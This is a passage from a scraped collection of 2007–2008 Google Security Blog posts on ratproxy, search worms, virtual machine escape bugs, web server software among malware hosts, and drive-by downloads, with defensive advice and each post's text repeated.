community, helping advance the community's understanding of security challenges associated with contemporary web technologies. We believe that responsible security research brings a net overall benefit to the safety of the Web as a whole, and have released this tool explicitly to support that kind of research.  To download the proxy, please visit this  page . Also, please keep in mind that the proxy is designed solely to highlight interesting patterns in web applications, and a further analysis by a security professional is often required to interpret the results and their significance for the tested platform.                                   Posted by Michal ZalewskiWe're happy to announce that we've just open-sourced ratproxy, a passive web application security assessment tool that we've been using internally at Google. This utility, developed by our information security engineering team, is designed to transparently analyze legitimate, browser-driven interactions with a tested web property and automatically pinpoint, annotate, and prioritize potential flaws or areas of concern.  The proxy analyzes problems such as cross-site script inclusion threats, insufficient cross-site request forgery defenses, caching issues, cross-site scripting candidates, potentially unsafe cross-domain code inclusion schemes and information leakage scenarios, and much more. (A more-detailed discussion of these features and information on securing vulnerable applications is provided here.) Compared with more-traditional active crawlers, or with fully manual request inspection and modification frameworks, this approach offers several significant advantages in terms of minimized overhead; marginalized risk of site disruptions; high coverage of complex, client-driven application states in web 2.0 solutions; and insight into dynamic cross-domain trust models.We decided to make this tool freely available as open source because we feel it will be a valuable contribution to the information security community, helping advance the community's understanding of security challenges associated with contemporary web technologies. We believe that responsible security research brings a net overall benefit to the safety of the Web as a whole, and have released this tool explicitly to support that kind of research.To download the proxy, please visit this page. Also, please keep in mind that the proxy is designed solely to highlight interesting patterns in web applications, and a further analysis by a security professional is often required to interpret the results and their significance for the tested platform.     ", "date": "July 1, 2008"},
{"website": "Google-Security", "title": "\nThe reason behind the \"We're sorry...\" message\n", "author": ["Posted by Niels Provos, Anti-Malware Team"], "link": "https://security.googleblog.com/2007/07/reason-behind-were-sorry-message.html", "abstract": "                                 Posted by Niels Provos, Anti-Malware Team   Some of you might have seen this message while searching on Google, and wondered what the reason behind it might be. Instead of search results, Google displays the \"We're sorry\" message when we detect anomalous queries from your network. As a regular user, it is possible to answer a  CAPTCHA  - a reverse Turing test meant to establish that we are talking to a human user - and to continue searching. However, automated processes such as worms would have a much harder time solving the CAPTCHA. Several things can trigger the   sorry   message. Often it's due to infected computers or DSL routers that proxy search traffic through your network - this may be at home or even at a workplace where one or more computers might be infected. Overly aggressive SEO ranking tools may trigger this message, too. In other cases, we have seen self-propagating worms that use Google search to identify vulnerable web servers on the Internet and then exploit them. The exploited systems in turn then search Google for more vulnerable web servers and so on.&nbsp; This can lead to a noticeable increase in search queries and   sorry   is one of our mechanisms to deal with this.  At  ACM WORM 2006 , we published a paper on  Search Worms [PDF]  that takes a much closer look at this phenomenon.   Santy , one of the search worms we analyzed, looks for remote-execution vulnerabilities in the popular phpBB2 web application. In addition to exhibiting worm like propagation patterns, Santy also installs a botnet client as a payload that connects the compromised web server to an IRC channel. Adversaries can then remotely control the compromised web servers and use them for DDoS attacks, spam or phishing. Over time, the adversaries have realized that even though a botnet consisting of web servers provides a lot of aggregate bandwidth, they can increase leverage by changing the content on the compromised web servers to infect visitors and in turn join the computers of compromised visitors into much larger botnets. This fundamental change from remote attack to client based download of malware formed the basis of the research presented in our  first post . In retrospect, it is interesting to see how two seemingly unrelated problems are tightly connected.                                    Posted by Niels Provos, Anti-Malware TeamSome of you might have seen this message while searching on Google, and wondered what the reason behind it might be. Instead of search results, Google displays the \"We're sorry\" message when we detect anomalous queries from your network. As a regular user, it is possible to answer a CAPTCHA - a reverse Turing test meant to establish that we are talking to a human user - and to continue searching. However, automated processes such as worms would have a much harder time solving the CAPTCHA. Several things can trigger the sorry message. Often it's due to infected computers or DSL routers that proxy search traffic through your network - this may be at home or even at a workplace where one or more computers might be infected. Overly aggressive SEO ranking tools may trigger this message, too. In other cases, we have seen self-propagating worms that use Google search to identify vulnerable web servers on the Internet and then exploit them. The exploited systems in turn then search Google for more vulnerable web servers and so on.  This can lead to a noticeable increase in search queries and sorry is one of our mechanisms to deal with this.At ACM WORM 2006, we published a paper on Search Worms [PDF] that takes a much closer look at this phenomenon.  Santy, one of the search worms we analyzed, looks for remote-execution vulnerabilities in the popular phpBB2 web application. In addition to exhibiting worm like propagation patterns, Santy also installs a botnet client as a payload that connects the compromised web server to an IRC channel. Adversaries can then remotely control the compromised web servers and use them for DDoS attacks, spam or phishing. Over time, the adversaries have realized that even though a botnet consisting of web servers provides a lot of aggregate bandwidth, they can increase leverage by changing the content on the compromised web servers to infect visitors and in turn join the computers of compromised visitors into much larger botnets. This fundamental change from remote attack to client based download of malware formed the basis of the research presented in our first post. In retrospect, it is interesting to see how two seemingly unrelated problems are tightly connected.     ", "date": "July 9, 2007"},
{"website": "Google-Security", "title": "\nOn virtualisation\n", "author": ["Posted by Tavis Ormandy, Security Team"], "link": "https://security.googleblog.com/2007/05/on-virtualisation.html", "abstract": "                             Posted by Tavis Ormandy, Security Team   Following  Panayiotis' and Niels' post  on malware, I'd like to discuss a somewhat related topic, virtualisation. Virtual machines are often used by security researchers to sandbox malware samples for analysis, or to protect a machine from a potentially hazardous activity. The theory is that any security threat or malicious behaviour will be restricted to the virtual environment which can be discarded and then restored to pristine condition after use.  Virtual machines are sometimes thought of as impenetrable barriers between the guest and host, but in reality they're (usually) just another layer of software between you and the attacker. As with any complex application, it would be naive to think such a large codebase could be written without some serious bugs creeping in. If any of those bugs are exploitable, attackers restricted to the guest could potentially break out onto the host machine. I investigated this topic earlier this year, and presented a  paper  at  CanSecWest  on a number of ways that an attacker could break out of a virtual machine.  Most of the attacks identified were flaws, such as buffer overflows, in emulated hardware devices. One example of this is missing bounds checking in  bitblt routines , which are used for moving rectangular blocks of data around the display. If exploited, by specifying pathological parameters for the operation, this could lead to an attacker compromising the virtual machine process. While you would typically require root (or equivalent) privileges in the guest to interact with a device at the low level required, device drivers will often offload the parameter checking required onto the hardware, so in theory an unprivileged attacker could be able to access flaws like this by simply interacting with the regular API or system call interface provided by the guest operating system.  While researching this topic we worked with the vendors affected to make sure they were aware of our findings, and provided patches where possible. I've also suggested some precautions virtualization you can take to minimise the impact of any flaws like this discovered in future, such as:           Reduce the attack surface     By disabling emulated devices, features and services you don't need you reduce the amount of code exposed to an attacker, thus reducing the number of possible bugs that can be exploited. You should also aim to protect the integrity of the guest operating system, making it harder for an attacker to get lower level access to emulated hardware. By keeping software in the guest up to date, and hardening it by locking down the operating system and minimising what is run with root or admin privileges, you can reduce the risk of privilege escalation attacks. If an attacker cannot get low level access to the emulated hardware, it will be more difficult to exploit the bugs in them. Remember that some legacy operating systems make no attempt to restrict access to I/O ports and similar interfaces, these should be used with caution in a security sensitive context.           Treat virtual machines as services that can be compromised     Most administrators will take steps to limit the impact of a compromise of a network facing daemon, such as using chroot() or running the daemon as a low privileged user. These same tactics can be applied to your virtual machine. As always, try to minimise what has to run as root or administrator.           Keep software up to date     Keep your virtual machine software up to date, and look out for any security advisories from your vendor so that you can apply any patches promptly.                                   Posted by Tavis Ormandy, Security TeamFollowing Panayiotis' and Niels' post on malware, I'd like to discuss a somewhat related topic, virtualisation. Virtual machines are often used by security researchers to sandbox malware samples for analysis, or to protect a machine from a potentially hazardous activity. The theory is that any security threat or malicious behaviour will be restricted to the virtual environment which can be discarded and then restored to pristine condition after use.Virtual machines are sometimes thought of as impenetrable barriers between the guest and host, but in reality they're (usually) just another layer of software between you and the attacker. As with any complex application, it would be naive to think such a large codebase could be written without some serious bugs creeping in. If any of those bugs are exploitable, attackers restricted to the guest could potentially break out onto the host machine. I investigated this topic earlier this year, and presented a paper at CanSecWest on a number of ways that an attacker could break out of a virtual machine.Most of the attacks identified were flaws, such as buffer overflows, in emulated hardware devices. One example of this is missing bounds checking in bitblt routines, which are used for moving rectangular blocks of data around the display. If exploited, by specifying pathological parameters for the operation, this could lead to an attacker compromising the virtual machine process. While you would typically require root (or equivalent) privileges in the guest to interact with a device at the low level required, device drivers will often offload the parameter checking required onto the hardware, so in theory an unprivileged attacker could be able to access flaws like this by simply interacting with the regular API or system call interface provided by the guest operating system.While researching this topic we worked with the vendors affected to make sure they were aware of our findings, and provided patches where possible. I've also suggested some precautions virtualization you can take to minimise the impact of any flaws like this discovered in future, such as:     Reduce the attack surface  By disabling emulated devices, features and services you don't need you reduce the amount of code exposed to an attacker, thus reducing the number of possible bugs that can be exploited. You should also aim to protect the integrity of the guest operating system, making it harder for an attacker to get lower level access to emulated hardware. By keeping software in the guest up to date, and hardening it by locking down the operating system and minimising what is run with root or admin privileges, you can reduce the risk of privilege escalation attacks. If an attacker cannot get low level access to the emulated hardware, it will be more difficult to exploit the bugs in them. Remember that some legacy operating systems make no attempt to restrict access to I/O ports and similar interfaces, these should be used with caution in a security sensitive context.     Treat virtual machines as services that can be compromised  Most administrators will take steps to limit the impact of a compromise of a network facing daemon, such as using chroot() or running the daemon as a low privileged user. These same tactics can be applied to your virtual machine. As always, try to minimise what has to run as root or administrator.     Keep software up to date  Keep your virtual machine software up to date, and look out for any security advisories from your vendor so that you can apply any patches promptly.     ", "date": "May 29, 2007"},
{"website": "Google-Security", "title": "\nWeb Server Software and Malware\n", "author": [], "link": "https://security.googleblog.com/2007/06/web-server-software-and-malware.html", "abstract": "                            Posted by Nagendra Modadugu, Anti-Malware Team  In this post, we investigate the distribution of web server software to provide insight into how server software is correlated to servers hosting malware binaries or engaging in drive-by-downloads.  We determine server operating system by examining the 'Server:' HTTP header reported by most web servers. A survey of servers running roughly 80 million domain names reveals the web server software distribution shown below. Note that these figures may have some margin of error as it is not unusual to find hundreds of domains served by a single IP address.   Web server software across the Internet.         Web server software distribution across the Internet.     Our numbers report a slightly larger fraction of Apache servers compared to the  Netcraft web server survey . Our analysis is based on crawl information and only root URLs were examined, therefore hosts that did not present a root URL (e.g. /index.htm) were not included in the statistics. This may have contributed to the disparity with the Netcraft numbers.  Amongst Apache servers, about 35% did not report any version information.  Presumably the lack of version information is considered to be a defense against version specific attacks and worms. We observed a long tail of Apache server versions; the top three detected were 1.3.37 (15%), 1.3.33 (7.91%), and 2.0.54 (6.25%).  Amongst Microsoft servers, IIS 6.0 is by far the most popular version, making up about 80% of all IIS servers.  IIS 5.0 made up most of the remainder.   Web server software across servers distributing malware.   We examined about 70,000 domains that over the past month have been either distributing malware or have been responsible for hosting browser exploits leading to drive-by-downloads.  The breakdown by server software is depicted below.  It is important to note that while many servers serve malware as a result of a server compromise (by remote exploits, password theft via keyloggers, etc.), some servers are configured to serve up exploits by their administrators.        Web server software distribution across malicious servers.    Compared to our sample of servers across the Internet, Microsoft IIS features twice as often (49% vs. 23%) as a malware distributing server.  Amongst Microsoft IIS servers, the share of IIS 6.0 and IIS 5.0 remained the same at 80% and 20% respectively.  The distribution of top featured Apache server versions was different this time: 1.3.37 (50%), 1.3.34 (12%) and 1.3.33 (5%).  21% of the Apache servers did not report any version information.  Incidentally, version 1.3.37 is the latest Apache server release in the 1.3 series, and it is hence somewhat of a surprise that this version features so prominently.  One other factor we observe is a vast collection of Apache modules in use.   Distribution of web server software by country.                                           Web server distribution by country        Malicious web server distribution by  country                The figure on the left shows the distribution of  all  Apache, IIS, and nginx webservers by country. Apache has the largest share, even though there is noticeable variation between countries. The figure on the right shows the distribution, by country, of webserver software of servers either distributing malware or hosting browser exploits. It is very interesting to see that in China and South Korea, a malicious server is much more likely to be running IIS than Apache.  We suspect that the causes for IIS featuring more prominently in these countries could be due to a combination of factors: first, automatic updates have not been enabled due to software piracy (piracy statistics from  NationMaster , and  BSA ), and second, some security patches are not available for pirated copies of Microsoft operating systems.  For instance the patch for a commonly seen ADODB.Stream exploit is  not available to pirated copies  of Windows operating systems.  Overall, we see a mix of results.  In Germany, for instance, Apache is more likely to be serving malware than Microsoft IIS, compared to the overall distributions of these servers.  In Asia, we see the reverse, which is part of the cause of Microsoft IIS having a disproportionately high representation at 49% of malware servers.  In summary, our analysis demonstrates how important it is to keep web servers patched to the latest patch level.                                       Posted by Nagendra Modadugu, Anti-Malware TeamIn this post, we investigate the distribution of web server software to provide insight into how server software is correlated to servers hosting malware binaries or engaging in drive-by-downloads.We determine server operating system by examining the 'Server:' HTTP header reported by most web servers. A survey of servers running roughly 80 million domain names reveals the web server software distribution shown below. Note that these figures may have some margin of error as it is not unusual to find hundreds of domains served by a single IP address.Web server software across the Internet.Web server software distribution across the Internet.Our numbers report a slightly larger fraction of Apache servers compared to the Netcraft web server survey. Our analysis is based on crawl information and only root URLs were examined, therefore hosts that did not present a root URL (e.g. /index.htm) were not included in the statistics. This may have contributed to the disparity with the Netcraft numbers.Amongst Apache servers, about 35% did not report any version information.  Presumably the lack of version information is considered to be a defense against version specific attacks and worms. We observed a long tail of Apache server versions; the top three detected were 1.3.37 (15%), 1.3.33 (7.91%), and 2.0.54 (6.25%).Amongst Microsoft servers, IIS 6.0 is by far the most popular version, making up about 80% of all IIS servers.  IIS 5.0 made up most of the remainder.Web server software across servers distributing malware.We examined about 70,000 domains that over the past month have been either distributing malware or have been responsible for hosting browser exploits leading to drive-by-downloads.  The breakdown by server software is depicted below.  It is important to note that while many servers serve malware as a result of a server compromise (by remote exploits, password theft via keyloggers, etc.), some servers are configured to serve up exploits by their administrators.Web server software distribution across malicious servers.Compared to our sample of servers across the Internet, Microsoft IIS features twice as often (49% vs. 23%) as a malware distributing server.  Amongst Microsoft IIS servers, the share of IIS 6.0 and IIS 5.0 remained the same at 80% and 20% respectively.The distribution of top featured Apache server versions was different this time: 1.3.37 (50%), 1.3.34 (12%) and 1.3.33 (5%).  21% of the Apache servers did not report any version information.  Incidentally, version 1.3.37 is the latest Apache server release in the 1.3 series, and it is hence somewhat of a surprise that this version features so prominently.  One other factor we observe is a vast collection of Apache modules in use.Distribution of web server software by country.                            Web server distribution by countryMalicious web server distribution by  country The figure on the left shows the distribution of all Apache, IIS, and nginx webservers by country. Apache has the largest share, even though there is noticeable variation between countries. The figure on the right shows the distribution, by country, of webserver software of servers either distributing malware or hosting browser exploits. It is very interesting to see that in China and South Korea, a malicious server is much more likely to be running IIS than Apache.We suspect that the causes for IIS featuring more prominently in these countries could be due to a combination of factors: first, automatic updates have not been enabled due to software piracy (piracy statistics from NationMaster, and BSA), and second, some security patches are not available for pirated copies of Microsoft operating systems.  For instance the patch for a commonly seen ADODB.Stream exploit is not available to pirated copies of Windows operating systems.Overall, we see a mix of results.  In Germany, for instance, Apache is more likely to be serving malware than Microsoft IIS, compared to the overall distributions of these servers.  In Asia, we see the reverse, which is part of the cause of Microsoft IIS having a disproportionately high representation at 49% of malware servers.  In summary, our analysis demonstrates how important it is to keep web servers patched to the latest patch level.     ", "date": "June 5, 2007"},
{"website": "Google-Security", "title": "\nIntroducing Google's online security efforts\n", "author": ["Posted by ", " ", " and Niels ", ", Anti-", " Team"], "link": "https://security.googleblog.com/2007/05/introducing-googles-anti-malware.html", "abstract": "                             Posted by  Panayiotis   Mavrommatis  and Niels  Provos , Anti- Malware  Team     Online security is an important topic for Google, our  users, and anyone who uses the Internet.  The related issues are  complex and dynamic and we've been looking for a way to foster discussion  on the topic and keep users informed.  Thus, we've started this blog  where we hope to    periodically provide updates on recent  trends, interesting findings, and efforts related to online security.  Among the issues we'll  tackle is    malware , which is the subject  of our inaugural post .       Malware  -- surreptitious software capable of stealing sensitive information from your computer -- is increasingly spreading over the web. Visiting a compromised web server with a vulnerable browser or  plugins  can result in your system being infected with a whole variety of  malware  without any interaction on your part. Software installations that leverage exploits are termed \"drive-by downloads\". To protect  Google's  users from this threat, we started an anti- malware  effort about a year ago. As a result, we can warn you in our  search results  if we know of a site to be harmful and even prevent exploits from loading with  Google Desktop Search .  Unfortunately, the scope of the problem has recently been somewhat misreported to suggest that one in 10 websites are potentially malicious. To clarify, a sample-based analysis puts the fraction of malicious pages at roughly  0.1% . The analysis described in our  paper  covers  billions  of URLs. Using targeted feature extraction and classification, we select a subset of URLs believed to be suspicious for in-depth investigation.  So far, we have investigated about 12 million suspicious URLs and found about 1 million that engage in drive-by downloads.  In most cases, the web sites that infect your system with  malware  are not intentionally doing so and are often unaware that their web servers have been compromised.  To get a better understanding about the geographic distribution of sites engaging in drive-by downloads, we analyzed the location of compromised web sites and the location of  malware  distribution hosts. At the moment, the majority of  malware  activity seems to happen in China, the U.S., Germany and Russia (see below):      Location of compromised web   sites.    These are often sites   that are benign in nature but have been compromised and have become dangerous   for users to visit.        Location of  malware  distribution     servers.    These are servers     that are used by  malware  authors to distribute their payload. Very often the     compromised sites are modified to include content from these servers.      The color coding works as follows: Green means that we did not find anything      unsual  in that country, yellow means low activity, orange medium activity     and red high activity.    Guidelines on safe browsing  First and foremost, enable automatic updates for your operating system as     well your browsers, browser  plugins  and other applications you are using.     Automatic updates ensure that your computer receives the latest security     patches as they are published.  We also recommend that you run an     anti-virus engine that checks network traffic and files on your computer for     known  malware  and abnormal behavior. If you want to be really sure that your     system does not become permanently compromised, you might even want to run     your browser in a virtual machine, which you can revert to a clean snapshot     after every browsing session.  Webmasters can learn more about cleaning, and most importantly, keeping     their sites secure at       StopBadware . org's      Tips for Cleaning and Securing a Website .                                      Posted by Panayiotis Mavrommatis and Niels Provos, Anti-Malware TeamOnline security is an important topic for Google, our  users, and anyone who uses the Internet.  The related issues are  complex and dynamic and we've been looking for a way to foster discussion  on the topic and keep users informed.  Thus, we've started this blog  where we hope to periodically provide updates on recent  trends, interesting findings, and efforts related to online security.  Among the issues we'll  tackle is malware, which is the subject  of our inaugural post.Malware -- surreptitious software capable of stealing sensitive information from your computer -- is increasingly spreading over the web. Visiting a compromised web server with a vulnerable browser or plugins can result in your system being infected with a whole variety of malware without any interaction on your part. Software installations that leverage exploits are termed \"drive-by downloads\". To protect Google's users from this threat, we started an anti-malware effort about a year ago. As a result, we can warn you in our search results if we know of a site to be harmful and even prevent exploits from loading with Google Desktop Search.Unfortunately, the scope of the problem has recently been somewhat misreported to suggest that one in 10 websites are potentially malicious. To clarify, a sample-based analysis puts the fraction of malicious pages at roughly 0.1%. The analysis described in our paper covers billions of URLs. Using targeted feature extraction and classification, we select a subset of URLs believed to be suspicious for in-depth investigation.  So far, we have investigated about 12 million suspicious URLs and found about 1 million that engage in drive-by downloads.  In most cases, the web sites that infect your system with malware are not intentionally doing so and are often unaware that their web servers have been compromised.To get a better understanding about the geographic distribution of sites engaging in drive-by downloads, we analyzed the location of compromised web sites and the location of malware distribution hosts. At the moment, the majority of malware activity seems to happen in China, the U.S., Germany and Russia (see below):Location of compromised web   sites. These are often sites   that are benign in nature but have been compromised and have become dangerous   for users to visit.Location of malware distribution     servers. These are servers     that are used by malware authors to distribute their payload. Very often the     compromised sites are modified to include content from these servers.      The color coding works as follows: Green means that we did not find anything     unsual in that country, yellow means low activity, orange medium activity     and red high activity.Guidelines on safe browsingFirst and foremost, enable automatic updates for your operating system as     well your browsers, browser plugins and other applications you are using.     Automatic updates ensure that your computer receives the latest security     patches as they are published.  We also recommend that you run an     anti-virus engine that checks network traffic and files on your computer for     known malware and abnormal behavior. If you want to be really sure that your     system does not become permanently compromised, you might even want to run     your browser in a virtual machine, which you can revert to a clean snapshot     after every browsing session.Webmasters can learn more about cleaning, and most importantly, keeping     their sites secure at     StopBadware.org's     Tips for Cleaning and Securing a Website.     ", "date": "May 21, 2007"}
]